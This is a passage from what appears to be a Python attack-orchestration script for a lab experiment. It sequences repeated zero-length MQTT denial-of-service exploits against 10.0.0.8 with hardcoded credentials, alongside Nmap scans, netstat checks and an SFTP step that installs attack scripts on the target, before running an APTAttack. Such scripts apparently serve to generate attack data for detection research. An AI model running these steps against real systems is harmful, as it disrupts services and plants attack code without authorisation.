            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),), (NmapSubDiscStep("10.0.0.8", pause=0), 1
                                                      ), (PauseStep(),), (PauseStep(),), (PauseStep(),),
            (SftpInstStep("10.0.0.8", ["/zero_len_attack.py", "/mqtt_utilities.py"], pause=0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=150, pause=0), 1
             ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=150, pause=0), 1
             ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=150, pause=0), 1
             ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=150, pause=0), 1
             ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(),),
            (NmapSubDiscStep("10.0.0.8", pause=0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=150, pause=0), 1
             ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=150, pause=0), 1
             ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=150, pause=0), 1
             ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=150, pause=0), 1
             ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(),),
            (NmapSubDiscStep("10.0.0.8", pause=0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=150, pause=0), 1
             ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=150, pause=0), 1
             ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=150, pause=0), 1
             ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=150, pause=0), 1
             ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(),),
            (NmapSubDiscStep("10.0.0.8", pause=0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=150, pause=0), 1
             ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=150, pause=0), 1
             ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=150, pause=0), 1
             ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=150, pause=0), 1
             ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(),),
            (NmapSubDiscStep("10.0.0.8", pause=0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=600, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=600, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=600, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=600, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=600, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=600, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=600, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=600, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=600, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=600, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=600, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=600, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=600, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=600, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=600, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=600, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=600, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=600, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(),),
            (PauseStep(),), (PauseStep(),),
            ]
exp_details = []
atk = APTAttack(step_seq, "zero_len_dos_sftp_inst_cam_test", exp_details, "/output/experiment_details.pkl")
atk.run()
atk.save_in()
